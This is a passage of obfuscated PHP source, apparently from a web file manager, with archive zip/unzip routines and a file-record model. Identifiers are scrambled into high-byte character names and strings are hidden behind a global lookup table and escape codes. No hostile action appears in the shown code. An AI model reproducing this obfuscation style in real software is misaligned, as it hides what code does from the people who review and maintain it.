implode($ÉüéÂÜ‚[231], $³Ë¨®‚»); } if (count($³Ë¨®‚») >= $ıÀ…ˆÛû) { $³Ë¨®‚» = array_slice($³Ë¨®‚», $ıÀ…ˆÛû * 0.5, $ıÀ…ˆÛû); } $³Ë¨®‚»[] = $ì€÷õ¼±; write_log($ÉüéÂÜ‚[162] . ACTION . $ÉüéÂÜ‚[1180] . $ì€÷õ¼±, $ÉüéÂÜ‚[1181]); } public static function getLastError($Ñ¾Õ˜Š‹ = '') { $å§—ú® = self::errorTips(-1); return $å§—ú® ? $å§—ú® : $Ñ¾Õ˜Š‹; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ŸˆĞÏ¶; if ($ŸˆĞÏ¶) { return $ŸˆĞÏ¶; } $í†¬ø˜³ = IO::init($_SERVER[Ó¡Ÿ§‚][8]); return $í†¬ø˜³; } private static function iconvSystem($ÁÕÁÏÇ¬) { return self::local()->iconvSystem($ÁÕÁÏÇ¬); } private static function iconvApp($€ôæÜªı) { return self::local()->iconvApp($€ôæÜªı); } public static function zipFolder($ÉêÓ¶í , $Ùáó¹Îï = "\172\x69\160", $âÙáÔÃ = '', $ÙÎÒù¾Å = REPEAT_RENAME) { $Ã¹œğìŠ =& $_SERVER[Ó¡Ÿ§‚]; $»ü¾ÊíÔ = IO::listPath($ÉêÓ¶í ); if (!$»ü¾ÊíÔ) { return !1; } $»ü¾ÊíÔ = array_merge($»ü¾ÊíÔ[$Ã¹œğìŠ[82]], $»ü¾ÊíÔ[$Ã¹œğìŠ[83]]); return self::zip($»ü¾ÊíÔ, $Ùáó¹Îï, $âÙáÔÃ, $ÙÎÒù¾Å); } public static function zip($ñ±ï’¥û, $˜úÉ¥î = "\172\151\160", $óÊ±¥¨Á = '', $®×¡¨ôà = REPEAT_RENAME) { $è•¡Ó“¡ =& $_SERVER[Ó¡Ÿ§‚]; if (is_string($ñ±ï’¥û) && $ñ±ï’¥û) { $ñ±ï’¥û = array(array($è•¡Ó“¡[84] => $ñ±ï’¥û)); } $¾ç÷ñ˜½ = self::init($ñ±ï’¥û[0][$è•¡Ó“¡[84]]); $ÎöÏâ³® = self::info($ñ±ï’¥û[0][$è•¡Ó“¡[84]]); $øÎè‹ûİ = $è•¡Ó“¡[12]; $ù€úæ¬Â = $è•¡Ó“¡[12]; $€¾®Øıè = $è•¡Ó“¡[12]; if ($óÊ±¥¨Á && substr($óÊ±¥¨Á, -1, 1) != $è•¡Ó“¡[8]) { $ù€úæ¬Â = get_path_father($óÊ±¥¨Á); $€¾®Øıè = get_path_this($óÊ±¥¨Á); } else { $ù€úæ¬Â = self::pathFather($ÎöÏâ³®[$è•¡Ó“¡[84]]); $€¾®Øıè = $ÎöÏâ³®[$è•¡Ó“¡[32]] . $è•¡Ó“¡[10] . $˜úÉ¥î; if (count($ñ±ï’¥û) > 1) { $í‰¤‡û = IO::info($ù€úæ¬Â); $€¾®Øıè = $í‰¤‡û[$è•¡Ó“¡[32]] . $è•¡Ó“¡[10] . $˜úÉ¥î; } if ($óÊ±¥¨Á) { $ù€úæ¬Â = $óÊ±¥¨Á; } } if ($¾ç÷ñ˜½->getType() == $è•¡Ó“¡[106]) { $ªä€¸¾ = self::init($ù€úæ¬Â); $¡¡‚ÅÇ¿ = $ªä€¸¾->getType() == $è•¡Ó“¡[106] ? $ù€úæ¬Â : get_path_father($¾ç÷ñ˜½->path); $¡¡‚ÅÇ¿ = rtrim($¡¡‚ÅÇ¿, $è•¡Ó“¡[8]) . $è•¡Ó“¡[8]; mk_dir($¡¡‚ÅÇ¿); } else { $øÎè‹ûİ = TEMP_FILES . $è•¡Ó“¡[1182] . time() . rand_string(8) . $è•¡Ó“¡[8]; mk_dir($øÎè‹ûİ); file_put_contents($øÎè‹ûİ . $è•¡Ó“¡[1183], $è•¡Ó“¡[12]); $¡¡‚ÅÇ¿ = $øÎè‹ûİ; } $Æ¦Ëé  = IO::info($¡¡‚ÅÇ¿); if (!$Æ¦Ëé  || !$Æ¦Ëé [$è•¡Ó“¡[203]]) { show_json(LNG($è•¡Ó“¡[1184]), !1); } $ØÑèâå¿ = self::zipFileList($ñ±ï’¥û, $øÎè‹ûİ); foreach ($ØÑèâå¿ as $â¦‰ÈÒø => $·üÛÖí) { $ØÑèâå¿[$â¦‰ÈÒø] = self::iconvSystem($·üÛÖí); } $´İˆ»Šâ = get_filename_auto($¡¡‚ÅÇ¿ . $€¾®Øıè, $è•¡Ó“¡[12], $®×¡¨ôà); KodArchive::create(self::iconvSystem($´İˆ»Šâ), $ØÑèâå¿); if (!IO::exist($´İˆ»Šâ)) { if ($øÎè‹ûİ) { del_dir($øÎè‹ûİ); } show_json(LNG($è•¡Ó“¡[1185]), !1); } if (!$øÎè‹ûİ) { return $´İˆ»Šâ; } $øË´®Ìê = self::move($´İˆ»Šâ, $ù€úæ¬Â, $®×¡¨ôà); if ($øÎè‹ûİ) { del_dir($øÎè‹ûİ); } if (!$´İˆ»Šâ) { show_json(LNG($è•¡Ó“¡[1185]), !1); } return $øË´®Ìê; } public static function unzip($°¿Êíº¶, $¥¦ÏÒÕ, $±Æ™´¹€ = "\55\61", $Ù¡£öá¼ = "\x72\145\160\154\x61\x63\145") { $ûËğ§£ü =& $_SERVER[Ó¡Ÿ§‚]; $°—ù¸ = parent::info($°¿Êíº¶); if (!$°—ù¸) { show_json(LNG($ûËğ§£ü[1186]), !1); } $‹òÚ†Úø = IO::infoFull($¥¦ÏÒÕ); if (!$‹òÚ†Úø) { $¥¦ÏÒÕ = IO::mkdir($¥¦ÏÒÕ); } if (isset($‹òÚ†Úø[$ûËğ§£ü[411]]) && trim($‹òÚ†Úø[$ûËğ§£ü[84]], $ûËğ§£ü[8]) != trim($¥¦ÏÒÕ, $ûËğ§£ü[8])) { $²¡ÕæÎş = KodIO::make($‹òÚ†Úø[$ûËğ§£ü[441]]); $¨Ö³™Ö = IO::fileNameAuto($²¡ÕæÎş, $‹òÚ†Úø[$ûËğ§£ü[32]], REPEAT_RENAME_FOLDER, !0); $¥¦ÏÒÕ = IO::mkdir($²¡ÕæÎş . $¨Ö³™Ö); } $±Æ™´¹€ = $±Æ™´¹€ && $±Æ™´¹€ != $ûËğ§£ü[1187] ? @json_decode($±Æ™´¹€, !0) : -1; $ò­İ„ = self::unzipPart($°¿Êíº¶, $±Æ™´¹€); if (!$ò­İ„ || !IO::exist($ò­İ„[$ûËğ§£ü[200]])) { show_json(LNG($ûËğ§£ü[105]), !1); } $­ÆÉà“¹ = $ò­İ„[$ûËğ§£ü[1188]][count($ò­İ„[$ûËğ§£ü[1188]]) - 1]; if ($­ÆÉà“¹[$ûËğ§£ü[1189]] == -1 || substr($­ÆÉà“¹[$ûËğ§£ü[32]], -1, 1) == $ûËğ§£ü[8]) { $ æ‘çÄ‡ = $ò­İ„[$ûËğ§£ü[1190]] . rand_string(10) . $ûËğ§£ü[8]; mk_dir($ æ‘çÄ‡); $¯ƒçÊâ = count($ò­İ„[$ûËğ§£ü[1188]]) == 1 ? IO::ext($°¿Êíº¶) : get_path_ext($ò­İ„[$ûËğ§£ü[200]]); $®Á—î¬· = KodArchive::extract(self::iconvSystem($ò­İ„[$ûËğ§£ü[200]]), $ æ‘çÄ‡, $­ÆÉà“¹[$ûËğ§£ü[1189]], $¨Ö³™Ö, $¯ƒçÊâ); self::unzipErrorCheck($®Á—î¬·, array($ûËğ§£ü[1191], $°¿Êíº¶, $¯ƒçÊâ, $¥¦ÏÒÕ, $ò­İ„)); Hook::trigger($ûËğ§£ü[1192], $ æ‘çÄ‡); recursion_dir($ æ‘çÄ‡, $¢©‚ó°ª, $½Ûø·•, 0); $‡ûö¡¬Š = array_merge($¢©‚ó°ª, $½Ûø·•); $´¨ÈŒÃü = array(); foreach ($‡ûö¡¬Š as $ùÊ®É¼¶) { $¿Ñüìñó = IO::move(self::iconvApp($ùÊ®É¼¶), $¥¦ÏÒÕ, $Ù¡£öá¼); if ($¿Ñüìñó) { $´¨ÈŒÃü[] = $¿Ñüìñó; } } del_dir($ æ‘çÄ‡); } else { $¿Ñüìñó = IO::move($ò­İ„[$ûËğ§£ü[200]], $¥¦ÏÒÕ, $Ù¡£öá¼, get_path_this($­ÆÉà“¹[$ûËğ§£ü[32]])); if ($¿Ñüìñó) { $´¨ÈŒÃü[] = $¿Ñüìñó; } } return $´¨ÈŒÃü ? $´¨ÈŒÃü : !1; } public static function unzipList($¾‰æÀ§ß) { $ÕÀã¤ĞÅ =& $_SERVER[Ó¡Ÿ§‚]; $‹˜£“­· = isset($¾‰æÀ§ß[$ÕÀã¤ĞÅ[1193]]) ? $¾‰æÀ§ß[$ÕÀã¤ĞÅ[1193]] : !1; $ÒÍı×¸“ = isset($¾‰æÀ§ß[$ÕÀã¤ĞÅ[1189]]) ? @json_decode($¾‰æÀ§ß[$ÕÀã¤ĞÅ[1189]], !0) : -1; $Àç±²€­ = self::unzipPart($¾‰æÀ§ß[$ÕÀã¤ĞÅ[84]], $ÒÍı×¸“); if (!$Àç±²€­ || !IO::exist($Àç±²€­[$ÕÀã¤ĞÅ[200]])) { show_json(LNG($ÕÀã¤ĞÅ[105]), !1); } $ÂüÒöŒ³ = $Àç±²€­[$ÕÀã¤ĞÅ[1188]][count($Àç±²€­[$ÕÀã¤ĞÅ[1188]]) - 1]; $íš’ú”Û = in_array(IO::ext($Àç±²€­[$ÕÀã¤ĞÅ[200]]), array($ÕÀã¤ĞÅ[313], $ÕÀã¤ĞÅ[1194], $ÕÀã¤ĞÅ[1195], $ÕÀã¤ĞÅ[1196], $ÕÀã¤ĞÅ[1197], $ÕÀã¤ĞÅ[1198])); if (!$‹˜£“­· && ($ÂüÒöŒ³[$ÕÀã¤ĞÅ[1189]] == -1 || $íš’ú”Û)) { $·»àĞÃÎ = $Àç±²€­[$ÕÀã¤ĞÅ[1190]] . get_path_this($Àç±²€­[$ÕÀã¤ĞÅ[200]]) . $ÕÀã¤ĞÅ[1199]; if (!IO::exist($·»àĞÃÎ)) { $ö§²·¸î = $ÂüÒöŒ³[$ÕÀã¤ĞÅ[1189]] == -1 ? get_path_ext(IO::pathThis($¾‰æÀ§ß[$ÕÀã¤ĞÅ[84]])) : get_path_ext($Àç±²€­[$ÕÀã¤ĞÅ[200]]); $Ä Ìı³ú = KodArchive::listContent(self::iconvSystem($Àç±²€­[$ÕÀã¤ĞÅ[200]]), !0, $ö§²·¸î); self::unzipErrorCheck($Ä Ìı³ú, array($ÕÀã¤ĞÅ[1200], $¾‰æÀ§ß, $Àç±²€­)); @file_put_contents($·»àĞÃÎ, json_encode($Ä Ìı³ú[$ÕÀã¤ĞÅ[1201]])); } return @json_decode(IO::getContent($·»àĞÃÎ), !0); } IO::fileOut($Àç±²€­[$ÕÀã¤ĞÅ[200]], $‹˜£“­·, get_path_this($ÂüÒöŒ³[$ÕÀã¤ĞÅ[32]])); die; } private static function zipFileList($¿¸÷‚šÊ, $£áŸéÃº = false) { $–¸ÁËÕŠ =& $_SERVER[Ó¡Ÿ§‚]; $šáƒ = array(); foreach ($¿¸÷‚šÊ as $ï½œŠ—–) { $¨Ó´æÙ = $ï½œŠ—–[$–¸ÁËÕŠ[84]]; if ($£áŸéÃº) { $¨Ó´æÙ = self::copy($ï½œŠ—–[$–¸ÁËÕŠ[84]], $£áŸéÃº, $–¸ÁËÕŠ[817]); } else { $ëöìóåÙ = self::init($ï½œŠ—–[$–¸ÁËÕŠ[84]]); if ($ëöìóåÙ->getType() == $–¸ÁËÕŠ[106]) { $¨Ó´æÙ = $ëöìóåÙ->path; } } if ($¨Ó´æÙ && self::local()->exist($¨Ó´æÙ)) { $šáƒ[$ï½œŠ—–[$–¸ÁËÕŠ[84]]] = $¨Ó´æÙ; } } if (!empty($šáƒ)) { return array_values($šáƒ); } show_json(LNG($–¸ÁËÕŠ[1164]), !1); } private static function localFilePath($œ«„ãŠ×) { $ü‹¼Şüü =& $_SERVER[Ó¡Ÿ§‚]; $õ€œÒ¬ı = KodIO::parse($œ«„ãŠ×); if ($õ€œÒ¬ı[$ü‹¼Şüü[33]] == KodIO::KOD_SOURCE) { $Ä‹ì¯´ = Model($ü‹¼Şüü[824])->fileInfoGet(KodIO::sourceID($œ«„ãŠ×)); if (!$Ä‹ì¯´[$ü‹¼Şüü[84]]) { show_json($ü‹¼Şüü[1202], !1); } $œ«„ãŠ× = $Ä‹ì¯´[$ü‹¼Şüü[84]]; } $£­Ğ™åô = self::init($œ«„ãŠ×); if ($£­Ğ™åô->pathParse[$ü‹¼Şüü[1150]]) { $œ«„ãŠ× = $£­Ğ™åô->pathParse[$ü‹¼Şüü[1150]]; $£­Ğ™åô = self::init($œ«„ãŠ×); } $Ú¨Å‰à = $£­Ğ™åô->getType(); if ($Ú¨Å‰à == $ü‹¼Şüü[106] || $Ú¨Å‰à == $ü‹¼Şüü[1203]) { if (!$£­Ğ™åô->exist($£­Ğ™åô->path)) { show_json(LNG($ü‹¼Şüü[105]), !1); } return $£­Ğ™åô->path; } return !1; } public static function unzipPart($á­èãË¨, $ƒ˜ùÊìê = -1) { $–Ğµêôà =& $_SERVER[Ó¡Ÿ§‚]; $¦†ˆÂ•¼ = IO::pathThis($á­èãË¨); if (!$ƒ˜ùÊìê || $ƒ˜ùÊìê == -1) { $Ôæã‘‚’ = array(array($–Ğµêôà[32] => $¦†ˆÂ•¼, $–Ğµêôà[1189] => -1)); $Ôæã‘‚’[0][$–Ğµêôà[1204]] = $Ôæã‘‚’[0][$–Ğµêôà[32]]; } else { if (is_array($ƒ˜ùÊìê)) { $Ôæã‘‚’ = $ƒ˜ùÊìê; $”±Ì«ª® = count($Ôæã‘‚’) - 1; for ($»ÖÕÊ…“ = 0; $»ÖÕÊ…“ <= $”±Ì«ª®; $»ÖÕÊ…“++) { $•½àËË× = $Ôæã‘‚’[$»ÖÕÊ…“]; $ÅúÌƒù© = get_path_this($•½àËË×[$–Ğµêôà[32]]) . (checkExtSafe($•½àËË×[$–Ğµêôà[32]]) ? $–Ğµêôà[12] : $–Ğµêôà[1205]); $Ôæã‘‚’[$»ÖÕÊ…“][$–Ğµêôà[1204]] = $–Ğµêôà[1206] . intval($•½àËË×[$–Ğµêôà[1189]]) . $–Ğµêôà[386] . $ÅúÌƒù©; if ($»ÖÕÊ…“ == 0) { continue; } $Ôæã‘‚’[$»ÖÕÊ…“][$–Ğµêôà[1204]] = $Ôæã‘‚’[$»ÖÕÊ…“ - 1][$–Ğµêôà[1204]] . $–Ğµêôà[1207] . $Ôæã‘‚’[$»ÖÕÊ…“][$–Ğµêôà[1204]]; } } } if (!is_array($Ôæã‘‚’) || count($Ôæã‘‚’) == 0) { return !1; } $©¤ş§´ñ = $Ôæã‘‚’[count($Ôæã‘‚’) - 1]; if (!IO::exist($á­èãË¨)) { return !1; } $¯£²³Å¤ = TEMP_FILES . $–Ğµêôà[1208] . kodIO::hashPathSafe($á­èãË¨) . $–Ğµêôà[8]; $Äë“ºŸ¬ = $¯£²³Å¤ . $©¤ş§´ñ[$–Ğµêôà[1204]]; mk_dir($¯£²³Å¤); file_put_contents(TEMP_FILES . $–Ğµêôà[1183], $–Ğµêôà[12]); if (IO::exist($Äë“ºŸ¬)) { return array($–Ğµêôà[200] => $Äë“ºŸ¬, $–Ğµêôà[1188] => $Ôæã‘‚’, $–Ğµêôà[1190] => $¯£²³Å¤); } $¬—°‚Û¿ = self::localFilePath($á­èãË¨); if (!$¬—°‚Û¿) { $¬—°‚Û¿ = $¯£²³Å¤ . $–Ğµêôà[1209]; if (!IO::exist($¬—°‚Û¿)) { self::copy($á­èãË¨, $¯£²³Å¤, !1, get_path_this($¬—°‚Û¿)); } } if (!$¬—°‚Û¿ || !IO::exist($¬—°‚Û¿)) { return !1; } if ($©¤ş§´ñ[$–Ğµêôà[1189]] == -1) { return array($–Ğµêôà[200] => $¬—°‚Û¿, $–Ğµêôà[1188] => $Ôæã‘‚’, $–Ğµêôà[1190] => $¯£²³Å¤); } $âŠûÎêè = $¬—°‚Û¿; foreach ($Ôæã‘‚’ as $»ÖÕÊ…“ => $•½àËË×) { if (!$•½àËË× || $•½àËË×[$–Ğµêôà[1189]] == $–Ğµêôà[1187]) { break; } if (substr($•½àËË×[$–Ğµêôà[32]], -1, 1) == $–Ğµêôà[8]) { break; } $û­Ê×¯ = in_array(get_path_ext($•½àËË×[$–Ğµêôà[1204]]), array($–Ğµêôà[313], $–Ğµêôà[1194], $–Ğµêôà[1195], $–Ğµêôà[1196], $–Ğµêôà[1197], $–Ğµêôà[1198])); $şªÂö½± = $»ÖÕÊ…“ == count($Ôæã‘‚’) - 1 && $û­Ê×¯; $¤İ•­ŠÁ = $¯£²³Å¤ . $•½àËË×[$–Ğµêôà[1204]]; $’«ÎÕÌã = $¯£²³Å¤ . get_path_this($•½àËË×[$–Ğµêôà[32]]); if (IO::exist($¤İ•­ŠÁ)) { $âŠûÎêè = $¤İ•­ŠÁ; continue; } $²º¯Ù¸š = $»ÖÕÊ…“ == 0 ? get_path_ext($¦†ˆÂ•¼) : get_path_ext($âŠûÎêè); $©ûÒ»‰º = KodArchive::extract(self::iconvSystem($âŠûÎêè), $¯£²³Å¤, $•½àËË×[$–Ğµêôà[1189]], $¦Õ´ªé†, $²º¯Ù¸š); self::unzipErrorCheck($©ûÒ»‰º, array($–Ğµêôà[1210], $á­èãË¨, $Ôæã‘‚’, $•½àËË×, $¤İ•­ŠÁ)); if (IO::exist($’«ÎÕÌã)) { IO::rename($’«ÎÕÌã, get_path_this($¤İ•­ŠÁ)); } $âŠûÎêè = $¤İ•­ŠÁ; } $Äë“ºŸ¬ = $âŠûÎêè; return array($–Ğµêôà[200] => $âŠûÎêè, $–Ğµêôà[1188] => $Ôæã‘‚’, $–Ğµêôà[1190] => $¯£²³Å¤); } private static function unzipErrorCheck($ùçêåâÈ, $ĞÚ‰ÆŠ = false) { $·ëÛ¡ë³ =& $_SERVER[Ó¡Ÿ§‚]; if ($ùçêåâÈ[$·ëÛ¡ë³[1211]]) { return !0; } write_log(array($·ëÛ¡ë³[1212], $ùçêåâÈ, $ĞÚ‰ÆŠ), $·ëÛ¡ë³[1213]); show_json($·ëÛ¡ë³[1214] . json_encode($ùçêåâÈ[$·ëÛ¡ë³[1201]]), !1); die; } } goto d‹ÇÑóÕë; cÅ¼ØØÍ‘ò: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\145"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\x6d\x65" => "\151\x6f\x5f\146\x69\x6c\x65\137\x6d\x65\x74\x61", "\155\145\x74\x61\x46\151\x65\154\144" => "\x66\x69\154\145\x49\104"); public function fileInfo($‰ÑÆõãÁ) { $ñìÎµ²ø =& $_SERVER[Ó¡Ÿ§‚]; static $Ãğ‹ê·¬ = array(); if (!isset($Ãğ‹ê·¬[$‰ÑÆõãÁ])) { $îèÈ´¦ = $ñìÎµ²ø[1903]; $ÄãÉç÷î = Model($ñìÎµ²ø[480])->field($îèÈ´¦)->where(array($ñìÎµ²ø[478] => $‰ÑÆõãÁ))->find(); $Ãğ‹ê·¬[$‰ÑÆõãÁ] = $ÄãÉç÷î; } return $Ãğ‹ê·¬[$‰ÑÆõãÁ]; } public function addFileByContent($°Ô£¹øÅ = '', $¦…ÔÇü” = '') { $æÊòÕûî =& $_SERVER[Ó¡Ÿ§‚]; $¸Ü÷º¬˜ = TEMP_PATH . $æÊòÕûî[1904]; if (!is_dir($¸Ü÷º¬˜)) { mk_dir($¸Ü÷º¬˜); } $¡‡˜äïµ = $¸Ü÷º¬˜ . $æÊòÕûî[1905] . rand_string(16); file_put_contents($¡‡˜äïµ, $°Ô£¹øÅ); $íÈĞïø‹ = $this->addFile($¡‡˜äïµ, $¦…ÔÇü”, !0); if (file_exists($¡‡˜äïµ)) { @unlink($¡‡˜äïµ); } return $íÈĞïø‹; } public function createFileName($ç”ƒ²¾ , $…á£´Ñ¿ = false, $ŠÇéªş = false) { $ØÑÜó±ì =& $_SERVER[Ó¡Ÿ§‚]; $Ô•†À…£ = IO::init($ØÑÜó±ì[8]); $Ö«äÈŠÈ = $this->makeFilePath($ç”ƒ²¾ , $Ô•†À…£, $…á£´Ñ¿, $ŠÇéªş); $Ê„º¾‰õ = $Ô•†À…£->pathFather($Ö«äÈŠÈ); static $Ø¹«™îë = false; $§‚ğì¬ß = $ØÑÜó±ì[1906] . md5($Ê„º¾‰õ); if (!$Ø¹«™îë && !Cache::get($§‚ğì¬ß)) { $Ø¹«™îë = !0; $Îó¹§­¬ = IO::mkdir($Ê„º¾‰õ); if (!IO::exist($Îó¹§­¬ . $ØÑÜó±ì[796])) { IO::mkfile($Îó¹§­¬ . $ØÑÜó±ì[796]); } Cache::set($§‚ğì¬ß, 1, 3600 * 2); } return $Ö«äÈŠÈ; } public function makeFilePath($Äªæ½öò, $¬«ò¦‚Û, $ÂşâéÄï = false, $è½²Ë÷× = false) { $ŸÍ—â™ =& $_SERVER[Ó¡Ÿ§‚]; $¾¡Í¨Œö = Model($ŸÍ—â™[769])->get($ŸÍ—â™[1907]); $†êÉ­×Ş = KodIO::defaultIO() . date($ŸÍ—â™[1908]); $åË”¯Ó² = $†êÉ­×Ş . rand_string(5) . short_id(100); $Äªæ½öò = str_replace($ŸÍ—â™[8], $ŸÍ—â™[11], KodIO::clear($Äªæ½öò)); $±ƒ”ÖÕÒ = $¬«ò¦‚Û->ext($Äªæ½öò); if (!$Äªæ½öò) { $¾¡Í¨Œö = $ŸÍ—â™[1909]; } switch ($¾¡Í¨Œö) { case $ŸÍ—â™[1910]: $åË”¯Ó² = $åË”¯Ó² . $ŸÍ—â™[10] . $¬«ò¦‚Û->ext($Äªæ½öò); if ($±ƒ”ÖÕÒ == $ŸÍ—â™[1847]) { $åË”¯Ó² .= $ŸÍ—â™[1205]; } break; case $ŸÍ—â™[1911]: $¡‚ÎËç€ = Model($ŸÍ—â™[769])->get($ŸÍ—â™[770]); $ˆÄ©¿¢Á = substr(md5($ŸÍ—â™[771] . $¡‚ÎËç€ . date($ŸÍ—â™[746])), 0, 8); $Øæš±´ = KodIO::defaultDriver(); $†êÉ­×Ş = $ŸÍ—â™[1236] . $Øæš±´[$ŸÍ—â™[399]] . $ŸÍ—â™[418] . date($ŸÍ—â™[1912]) . $ˆÄ©¿¢Á . $ŸÍ—â™[8]; if ($±ƒ”ÖÕÒ == $ŸÍ—â™[1847]) { $Äªæ½öò .= $ŸÍ—â™[1205]; } $ÃÖîéà = $ŸÍ—â™[1913] . $†êÉ­×Ş . $Äªæ½öò; CacheLock::lock($ÃÖîéà); $åË”¯Ó² = $†êÉ­×Ş . $Äªæ½öò; if (IO::exist($†êÉ­×Ş . $Äªæ½öò)) { $üëô¶èÂ = substr($Äªæ½öò, 0, strlen($Äªæ½öò) - strlen($±ƒ”ÖÕÒ)); $®Ù’‚¨ı = $è½²Ë÷× ? substr($è½²Ë÷×, 0, 5) : ($ÂşâéÄï ? substr($ÂşâéÄï, 0, 5) : rand_string(5)); $åË”¯Ó² = $†êÉ­×Ş . $üëô¶èÂ . $®Ù’‚¨ı . $ŸÍ—â™[10] . $±ƒ”ÖÕÒ; } if (IO::isTypeObject($åË”¯Ó²) && !IO::isUploadServer($åË”¯Ó²)) { if (IO::exist($åË”¯Ó²)) { return $åË”¯Ó²; } $ãôöµà = IO::setContent($åË”¯Ó², $ŸÍ—â™[12]); if (!$ãôöµà) { show_json($ŸÍ—â™[1914], !1); } } CacheLock::unlock($ÃÖîéà); break; case $ŸÍ—â™[1909]: break; default: break; } return $åË”¯Ó²; } public function addFileByRemote($õ‡§ôŠº, $°àç—÷å, $Ôº¹ñ³ = array()) { $ãĞØ¼ô =& $_SERVER[Ó¡Ÿ§‚]; if (!IO::exist($õ‡§ôŠº)) { return !1; } $Š—±ûÓ± = $Ôº¹ñ³[$ãĞØ¼ô[176]] ? $Ôº¹ñ³[$ãĞØ¼ô[176]] : $ãĞØ¼ô[12]; $¬ŒßĞ×é = IO::hashMd5($õ‡§ôŠº, $Š—±ûÓ±); $ŠÈíÌå¸ = KodIO::defaultDriver(); $¼ãäÊ¤° = array($ãĞØ¼ô[554] => IO::size($õ‡§ôŠº), $ãĞØ¼ô[1915] => 1, $ãĞØ¼ô[429] => $°àç—÷å, $ãĞØ¼ô[807] => $ŠÈíÌå¸[$ãĞØ¼ô[399]], $ãĞØ¼ô[430] => $õ‡§ôŠº, $ãĞØ¼ô[1916] => $Ôº¹ñ³[$ãĞØ¼ô[177]] ? $Ôº¹ñ³[$ãĞØ¼ô[177]] : IO::hashSimple($õ‡§ôŠº), $ãĞØ¼ô[1917] => $¬ŒßĞ×é ? $¬ŒßĞ×é : $Š—±ûÓ±); if ($Õ©ËÊÃĞ = $this->addFileCheckExist($¼ãäÊ¤°[$ãĞØ¼ô[177]], $¼ãäÊ¤°[$ãĞØ¼ô[176]], $¼ãäÊ¤°[$ãĞØ¼ô[76]])) { return $Õ©ËÊÃĞ; } return $this->addFileData($¼ãäÊ¤°); } private function addFileData($£Üß˜‹) { $¿ù¡˜ã =& $_SERVER[Ó¡Ÿ§‚]; if (!$£Üß˜‹) { return !1; } $£Üß˜‹[$¿ù¡˜ã[76]] = intval($£Üß˜‹[$¿ù¡˜ã[76]]); if (!$£Üß˜‹[$¿ù¡˜ã[76]] && strlen($£Üß˜‹[$¿ù¡˜ã[177]]) > 32) { $£Üß˜‹[$¿ù¡˜ã[76]] = intval(substr($£Üß˜‹[$¿ù¡˜ã[177]], 32)); } $ƒ™¯Ş†ö = $this->add($£Üß˜‹); return $this->find($ƒ™¯Ş†ö); } public function addFile($İ¥¥ÀÔ·, $Û··¦°ü, $şé„ı€½ = false) { $…†ÒñÚÛ =& $_SERVER[Ó¡Ÿ§‚]; $÷á¸„  = IO::hashSimple($İ¥¥ÀÔ·); $¥²ò£Öô = IO::size($İ¥¥ÀÔ·); $Ì’®ğş¥ = $¥²ò£Öô <= 1024 * 1024 * 10 ? IO::hashMd5($İ¥¥ÀÔ·) : $…†ÒñÚÛ[12]; $ªòğÜï = $…†ÒñÚÛ[1918] . $÷á¸„ ; CacheLock::lock($ªòğÜï); if ($Ì’®ğş¥ && $÷á¸„ ) { $ºè÷œ­… = $this->addFileCheckExist($÷á¸„ , $Ì’®ğş¥, $¥²ò£Öô); if ($ºè÷œ­…) { CacheLock::unlock($ªòğÜï); return $ºè÷œ­…; } } $»şØä¶ = $this->addFileMake($İ¥¥ÀÔ·, $¥²ò£Öô, $÷á¸„ , $Ì’®ğş¥, $Û··¦°ü, $şé„ı€½); $¥Ç÷ÅÏ = $this->addFileData($»şØä¶); CacheLock::unlock($ªòğÜï); if (!$Ì’®ğş¥ && $¥Ç÷ÅÏ) { $this->fileMd5Check($¥Ç÷ÅÏ); } return $¥Ç÷ÅÏ; } private function fileMd5Check($¬äùÆß) { $İ¦ØöáÙ =& $_SERVER[Ó¡Ÿ§‚]; $œŒ‰ä = array($¬äùÆß[$İ¦ØöáÙ[477]], $¬äùÆß[$İ¦ØöáÙ[84]]); $£¯¢îï­ = $İ¦ØöáÙ[1919] . $¬äùÆß[$İ¦ØöáÙ[84]]; $¬È‰Ğø = $İ¦ØöáÙ[1920] . $¬äùÆß[$İ¦ØöáÙ[477]]; $¥»Öñåó = TaskQueue::add($İ¦ØöáÙ[1921], $œŒ‰ä, $£¯¢îï­, $¬È‰Ğø); if (!$¥»Öñåó) { $this->fileMd5Set($¬äùÆß[$İ¦ØöáÙ[477]], $¬äùÆß[$İ¦ØöáÙ[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($”Ú¿ô›ƒ, $ÕüøÈ»®) { $î¼Á¤—‹ =& $_SERVER[Ó¡Ÿ§‚]; $üùúúÛ¶ = $this->find($”Ú¿ô›ƒ); if (!$üùúúÛ¶ || $üùúúÛ¶[$î¼Á¤—‹[176]]) { return; } $å•Ø¢¹Ù = IO::hashMd5($ÕüøÈ»®); if (!$å•Ø¢¹Ù) { return $î¼Á¤—‹[12]; } $this->where(array($î¼Á¤—‹[477] => $”Ú¿ô›ƒ))->save(array($î¼Á¤—‹[176] => $å•Ø¢¹Ù)); } public function addFileMake($ùÁ¤¹ÍÁ, $«‚ğù®ı, $êÔè„Ó, $¢°¯ï, $Şµí‘¨É, $ÄÇ‡Ñà) { $¨¤ç·®® =& $_SERVER[Ó¡Ÿ§‚]; $’×–”âó = $this->createFileName($Şµí‘¨É, $êÔè„Ó, $¢°¯ï); $ŸËìé³• = get_path_father($’×–”âó); $‹´«÷÷‡ = get_path_this($’×–”âó); if ($ÄÇ‡Ñà) { $¹ç™°İÛ = IO::move($ùÁ¤¹ÍÁ, $ŸËìé³•, !1, $‹´«÷÷‡); } else { $¹ç™°İÛ = IO::copy($ùÁ¤¹ÍÁ, $ŸËìé³•, !1, $‹´«÷÷‡); } if (!$¹ç™°İÛ) { return !1; } $É™êáŞ¸ = KodIO::defaultDriver(); $öêİÉ¼ = array($¨¤ç·®®[554] => $«‚ğù®ı, $¨¤ç·®®[1915] => 1, $¨¤ç·®®[429] => $Şµí‘¨É, $¨¤ç·®®[807] => $É™êáŞ¸[$¨¤ç·®®[399]], $¨¤ç·®®[430] => $’×–”âó, $¨¤ç·®®[1916] => $êÔè„Ó, $¨¤ç·®®[1917] => $¢°¯ï); return $öêİÉ¼; } public function addFileCheckExist($äªã£¬Ø, $à©µæÁ, $Õ³¨ÄÖñ) { $Çìá½¢” =& $_SERVER[Ó¡Ÿ§‚]; $¢á¶ââ  = $this->findByHash($äªã£¬Ø, $à©µæÁ); if (!$¢á¶ââ ) { return !1; } $Ì¼ì®‹¨ = array($Çìá½¢”[1915] => intval($¢á¶ââ [$Çìá½¢”[1922]]) + 1, $Çìá½¢”[554] 